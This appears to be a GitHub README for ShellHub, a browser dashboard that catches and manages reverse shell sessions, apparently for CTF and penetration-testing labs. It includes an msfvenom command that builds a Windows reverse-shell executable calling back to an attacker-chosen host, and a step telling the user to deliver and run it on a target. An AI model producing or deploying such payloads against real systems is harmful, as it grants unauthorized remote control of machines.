# ShellHub

**Lightweight web-based reverse shell session manager.**  
Manage multiple shells from your browser — no more juggling terminal windows.

![demo](demo/screenshot.svg)

---

## Features

| Feature | Description |
|---------|-------------|
| **Web Dashboard** | All sessions visible in one browser UI |
| **In-Browser Terminal** | Full xterm.js terminal — send commands, see output live |
| **Session History** | All commands & output saved to SQLite — persists across restarts |
| **Session Naming** | Double-click to rename sessions (e.g., "THM Pickle Rick") |
| **Notes & Flags** | Attach notes and captured flags to each session |
| **Cheat Sheet** | Built-in reference for payloads, commands, post-exploitation |
| **Lightweight** | Single Python file, no database setup, no dependencies beyond FastAPI |

---

## Quick Start

```bash
git clone https://github.com/NullSec8/ShellHub.git
cd ShellHub
pip install -r requirements.txt
python shellhub.py
```

Open **http://localhost:8080** in your browser.

---

## Usage

1. Start ShellHub — it listens for reverse shells on **port 4444**
2. Generate a payload pointing to your IP on port 4444:

   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe
   ```

3. Deliver & run the payload on the target
4. The session appears in your browser — click to interact

### Testing locally

```bash
# Terminal 1: start ShellHub
python shellhub.py

# Terminal 2: simulate a reverse shell
nc localhost 4444
```

---

## Options

Configure ports by editing `shellhub.py`:

- **TCP listener:** line `asyncio.start_server(handle_tcp, "0.0.0.0", 4444)`
- **Web UI:** line `uvicorn.run(app, host="0.0.0.0", port=8080)`

---

## Cheat Sheet

Built-in at [http://localhost:8080/cheatsheet](http://localhost:8080/cheatsheet) — includes:

- MSFVenom payload generation commands
- Reverse shell one-liners (bash, python, powershell, php, perl)
- Metasploit listener setup & post-exploitation
- Linux & Windows enumeration commands
- Nmap, web scanning, Python HTTP server

---

## Disclaimer

This tool is for **educational purposes and authorized security testing only.**  
Unauthorized use against systems you do not own or have explicit permission to test is illegal.

---

## License

MIT
